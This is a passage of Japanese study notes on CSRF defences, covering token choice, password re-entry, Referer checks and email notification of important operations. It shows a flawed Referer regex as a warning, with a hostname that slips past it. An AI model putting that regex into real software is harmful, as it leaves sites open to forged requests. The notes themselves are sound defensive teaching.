・ワンタイムトークンを使うと正当な操作までエラーになることがある

この本ではワンタイムでないトークンを推奨している

### パスワード再入力

CSRF対策が必要なページに対してパスワード再入力を求めることで不正なリクエストを識別する

* 商品の購入で利用者の意志を再確認する
* 共有PCなどで本当に正規の利用者であるかを確認する

上記場面ではパスワード再入力は有効

* Refererのチェック
CSRF対策が必要なページに対してRefererを確認することで不正なリクエストを識別する

* Refererが送信されないように設定されているとそのページを実行できない
* 脆弱なRefererチェックに注意する

```
'^http://sample\.com'
```
`sample.com`で始まっているかだけをチェックしていると`sample.com.trap.com`がすり抜けてしまう

### CSRF攻撃への保険的対策
「重要な処理」を実行後、対象利用者に処理内容をメールで通知する。

* 攻撃があったことに気がつきやすくなる。
* メールは平文で送信されるので重要な情報は記載しないこと。
